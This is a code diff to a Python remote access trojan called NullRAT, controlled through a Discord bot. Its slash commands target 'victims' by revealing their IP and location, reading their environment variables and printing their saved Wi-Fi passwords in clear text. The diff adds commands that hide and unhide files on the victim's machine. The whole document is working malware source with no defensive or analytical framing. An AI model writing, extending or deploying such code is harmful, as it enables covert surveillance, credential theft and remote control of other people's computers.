@@ -1,8 +1,8 @@
 from Variables import *
 
 import disnake as discord
-from disnake.ext import commands
 from disnake import Embed
+from disnake.ext import commands
 
 from mss import mss
 from requests import get, post
@@ -11,7 +11,7 @@ from socket import create_connection
 import os, subprocess, re, time
 
 client, original_dir = commands.Bot(), os.getcwd()
-nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata"
+nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
 
 @client.event
 async def on_ready():
@@ -22,10 +22,10 @@ async def on_ready():
 # Intelligence Gathering #
 @client.slash_command(description="Finds the IP address of victims", guild_ids=server_ids)
 async def getip(ctx):
-    await ctx.response.send_message("Checking all available victims...")
     await ctx.channel.send(
         embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
     )
+    await ctx.response.send_message("Checking all available victims...")
 
 @client.slash_command(description="Finds the values of environment variables", guild_ids=server_ids)
 async def getenv(ctx, victim, env_var):
@@ -46,7 +46,7 @@ async def geolocate(ctx, victim):
     if str(victim) == str(IP()):
         data = get("http://ip-api.com/json/").json()
         embed = discord.Embed(
-            title="Geolocation Information \n(Powered by ip-api)", color=0x0081FA
+            title="Geolocation Information\n(Powered by ip-api)", color=0x0081FA
         )
         if data["status"] == "fail": return await ctx.send("```Unable to get Geolocation Info!```")
         embed.add_field(name="Country name", value=f"{data['country']} ({data['countryCode']})", inline=True)
@@ -338,6 +338,24 @@ async def wifipass(ctx, victim, name):
     if str(victim) == str(IP()):
         await ctx.response.send_message(f"```{os.popen(f'netsh wlan show profile {name} key=clear | findstr Key').read()}```")
         
+@client.slash_command(description="Hide file", guild_ids=server_ids)
+async def hide(ctx, victim, file):
+    if str(victim) == str(IP()): 
+        try:
+            run_command('attrib +H {}'.format(file))
+            await ctx.response.send_message("File hidden successfully")
+        except: 
+            await ctx.response.send_message("Unable to hide file. Check path and try again")
+                    
+@client.slash_command(description="Unhide file", guild_ids=server_ids)
+async def unhide(ctx, victim, file):
+    if str(victim) == str(IP()): 
+        try:
+            run_command('attrib -H {}'.format(file))
+            await ctx.response.send_message("File unhidden successfully")
+        except: 
+            await ctx.response.send_message("Unable to show file. Check path and try again")
+            
 @client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
 async def close(ctx, victim):
     if str(victim) == str(IP()):
